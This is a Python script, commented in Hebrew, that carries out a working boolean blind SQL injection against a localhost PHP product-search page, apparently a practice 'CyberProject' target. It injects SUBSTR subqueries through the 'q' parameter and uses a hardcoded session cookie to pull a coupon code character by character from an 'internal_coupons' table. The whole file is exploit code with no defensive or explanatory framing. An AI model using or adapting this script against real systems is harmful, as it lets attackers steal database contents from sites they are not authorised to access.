import requests
import string

# --- נתונים שהוצאנו מהסקריפט שעובד ---
BASE_URL = "http://localhost/CyberProject/products.php"
COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'} 

#Charset הכולל אותיות ומספרים
CHARSET = string.ascii_uppercase + string.digits

def check_condition(payload):
    # אנחנו משתמשים בפרמטר q ובשיטת GET כי שם ה-UNION עבד
    params = {'q': f"%' AND ({payload}) --"}
    response = requests.get(BASE_URL, params=params, cookies=COOKIES)
    
    # ב-Blind SQLi, אנחנו מחפשים סימן שהתנאי הצליח.
    # אם התנאי אמת, האתר יציג מוצרים. אם שקר, האתר יהיה ריק (כי הוספנו AND).
    # נבדוק אם מופיעה המילה 'product-card' שקיימת ב-HTML שלך
    return "product-card" in response.text

def leak_coupon():
    coupon = ""
    print("[*] Starting Blind SQLi to leak coupons from 'internal_coupons'...")
    
    while True:
        found_char = False
        for char in CHARSET:
            # בניית השאילתה:
            # אנחנו מניחים שיש טבלה בשם internal_coupons ועמודה בשם encrypted_code
            # אנחנו משתמשים ב-CAST כדי להפוך את ה-BLOB לטקסט (ב-SQLite)
            current_pos = len(coupon) + 1
            
            # השאילתה בודקת: האם התו במיקום X שווה ל-Char?
            sub_query = f"SELECT SUBSTR(CAST(encrypted_code AS TEXT),{current_pos},1) FROM internal_coupons LIMIT 1"
            payload = f"({sub_query})='{char}'"
            
            if check_condition(payload):
                coupon += char
                print(f"[+] Found character: {coupon}")
                found_char = True
                break
        
        if not found_char:
            break
            
    return coupon

# הרצה
final_result = leak_coupon()
print(f"\n[!] Final Coupon Leaked: {final_result}")